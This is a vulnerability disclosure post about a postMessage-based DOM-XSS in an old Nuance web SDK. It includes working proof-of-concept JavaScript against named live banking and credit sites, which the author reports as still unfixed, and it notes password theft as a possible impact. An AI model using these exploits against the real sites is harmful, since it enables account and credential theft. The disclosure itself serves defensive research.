---
title: Nuance Library XSS
---

The [@nuance-sdk/websdk-bootstrap](https://docs.nuance.com/agent-coach/APIs/Web-SDK/architectural-overview.html) version 2.5.0 or below would allow XSS via postMessage if the UUID is known; it's normally a hardcoded public value.
Newer library versions added an origin check `if (this.frameEl && this.frameEl.src.indexOf(e.origin) == -1)`

# XSS on https://www.wellsfargo.com

It was triaged as Medium (4.7) but later closed because "DOM-XSS is explicitly out of scope in the program policy". An attempt was made to contact HackerOne support, who think DOM-XSS has a limited risk due to its client-side nature and said public disclosure is a code of conduct violation.
During my account deletion request, they changed program policy to allow DOM-XSS; however, they still did not fix it. <https://hackerone.com/wellsfargo-bbp/policy_versions?change=3751314&type=team>

```js
onclick = () => {
  let win = open(
    'https://www.wellsfargo.com/goals-credit/smarter-credit/credit-101/fico/'
  );

  setTimeout(() => {
    // Ask the bank to create an iframe for favicon.ico as it does not have as strict a CSP.
    win.postMessage(
      JSON.stringify({
        UUID: 'WF_10006005',
        command: '1_PC_CREATE',
        info: {
          iframeId: 'favicon',
          src: ['https://www.wellsfargo.com/favicon.ico']
        }
      }),
      '*'
    );
  }, 2000);
  setTimeout(() => {
    // Ask the bank to eval some JS via favicon.
    win.postMessage(
      JSON.stringify({
        UUID: 'WF_10006005',
        command: 'CALL_OUT_FUNC',
        info: {
          name: 'favicon.contentWindow.eval',
          params: ['top.alert(window.origin)']
        }
      }),
      '*'
    );
  }, 3000);
};
```

# XSS on https://d.comenity.net

This site has no security contact and emailing their privacy contact did not result in the issue being fixed.

```js
onclick = () => {
  let win = open('https://d.comenity.net/ac/nflvisa/public/home');

  setInterval(() => {
    win.postMessage(
      JSON.stringify({
        UUID: '1112233',
        command: 'CALL_OUT_FUNC',
        info: {name: 'eval', params: ['alert(window.origin)']}
      }),
      '*'
    );
  }, 2000);
};
```

# Impact

Both sites have a login form so it could steal user passwords that may be automatic in the case of password manager usage or indirectly by using a scary message.

It does have `autocomplete="off"` but many modern browsers do not support autocomplete="off" for login fields. <https://developer.mozilla.org/en-US/docs/Web/Security/Practical_implementation_guides/Turning_off_form_autocompletion#managing_autofill_for_login_fields>

Other impacts may exist like if the origin contains or can embed account management, exposed cookies, site isolation bypass.

# Public disclosure

While I acknowledge there's very "limited" extra risks in regards to public disclosure here I dont feel there is any more I can do with unresponsive teams. If companies do feel that report submitting requires an NDA they are wrong and should never threaten over disclosure or pay for silence.
Also, if I don't release this, I will be thinking about it, and that's a lot worse than any company's actions.
